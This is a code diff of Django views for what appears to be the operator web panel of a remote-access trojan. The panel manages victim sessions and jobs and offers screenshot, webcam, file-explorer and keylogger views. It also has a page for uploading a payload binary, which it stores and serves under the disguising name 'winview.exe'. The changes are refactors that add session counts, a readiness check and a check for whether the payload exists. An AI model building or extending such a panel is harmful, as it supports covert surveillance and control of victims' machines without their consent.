@@ -67,8 +67,21 @@ def jobs_kill(request, id):
 
 def home(request):
 	flag = (toolbox != None)
-	return render(request, 'server/home.html', {'flag': flag})
 
+	sessions = jobs = []
+	_payload_exists = False
+	if toolbox:
+		sessions = toolbox.get_sessions()
+		jobs = toolbox.get_jobs()
+		_payload_exists = payload_exists()
+
+
+	return render(request, 'server/home.html', {'flag': flag, 'sessions': sessions, 'sessions_nbr': len(sessions), 'jobs': jobs, 'jobs_nbr': len(jobs), 'payload_exists': _payload_exists})
+
+def ready(request):
+	value = (toolbox != None)
+	
+	return JsonResponse({'value': value}) 
 
 def sessions(request):
 	# Check toolbox
@@ -104,7 +117,7 @@ def action_screenshot(request, id):
 
 def session_screenshot(request, id):
 	images = toolbox.get_screenshots_url(session=int(id))
-	return render(request, 'server/session_screenshot.html', {'id': int(id), 'images': images})
+	return render(request, 'server/session_screenshot.html', {'id': int(id), 'images': images, 'len_images': len(images)})
 
 
 def action_webcam(request, id):
@@ -170,28 +183,31 @@ def session_explorer(request, id):
 	return render(request, 'server/session_explorer.html', {'id': int(id), 'files': files, 'pwd': pwd, 'ls_error': error, 'have_uploaded': upload != None, 'have_uploaded_successfully': uploaded})
 
 
+def payload_exists():
+	payload_file = os.path.join(anssi.settings.MEDIA_ROOT, 'payload', 'winview.exe')
+	return os.path.exists(payload_file)
+
+
 def upload_payload(request):
 	payload_link = '/media/payload/winview.exe'
 	payload_file = os.path.join(anssi.settings.MEDIA_ROOT, 'payload', 'winview.exe')
-	payload_exists = False
-
-	if os.path.exists(payload_file):
-		payload_exists = True
+	_payload_exists = payload_exists()
 
 	uploaded = False
 
 	if request.method == 'POST':
 		uploaded_file = request.FILES.get('payload_binary', None)
 
-		fs = FileSystemStorage()
+		if uploaded_file:
+			fs = FileSystemStorage()
 
-		if payload_exists:
-			fs.delete(payload_file)
+			if _payload_exists:
+				fs.delete(payload_file)
 
-		filename = fs.save('payload/winview.exe', uploaded_file)
-		uploaded = True
+			fs.save('payload/winview.exe', uploaded_file)
+			uploaded = True
 
-	return render(request, 'server/payload.html', {'uploaded': uploaded, 'link': payload_link, 'exists': payload_exists})
+	return render(request, 'server/payload.html', {'uploaded': uploaded, 'link': payload_link, 'exists': _payload_exists})
 
 
 def session_keylogger(request, id):
